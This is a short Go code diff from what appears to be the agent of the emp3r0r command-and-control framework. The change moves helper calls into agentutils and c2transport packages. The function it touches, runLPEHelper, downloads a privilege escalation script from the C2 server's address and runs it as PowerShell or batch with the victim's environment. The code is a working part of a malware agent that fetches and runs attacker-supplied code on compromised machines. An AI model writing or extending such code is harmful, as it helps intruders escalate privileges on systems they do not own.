@@ -9,6 +9,8 @@ import (
 	"os"
 	"strings"
 
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/agentutils"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 )
 
@@ -19,7 +21,7 @@ func runLPEHelper(method, checksum string) (out string) {
 
 	log.Printf("Downloading LPE script from %s", def.CCAddress+method)
 	var scriptData []byte
-	scriptData, err := SmartDownload("", method, "", checksum)
+	scriptData, err := c2transport.SmartDownload("", method, "", checksum)
 	if err != nil {
 		return "Download error: " + err.Error()
 	}
@@ -29,12 +31,12 @@ func runLPEHelper(method, checksum string) (out string) {
 	file_type := strings.Split(method, ".")[len(strings.Split(method, "."))-1]
 	switch file_type {
 	case "ps1":
-		out, err = RunPSScript(scriptData, os.Environ())
+		out, err = agentutils.RunPSScript(scriptData, os.Environ())
 		if err != nil {
 			return fmt.Sprintf("LPE error: %s\n%v", out, err)
 		}
 	case "bat":
-		out, err = RunBatchScript(scriptData, os.Environ())
+		out, err = agentutils.RunBatchScript(scriptData, os.Environ())
 		if err != nil {
 			return fmt.Sprintf("LPE error: %s\n%v", out, err)
 		}
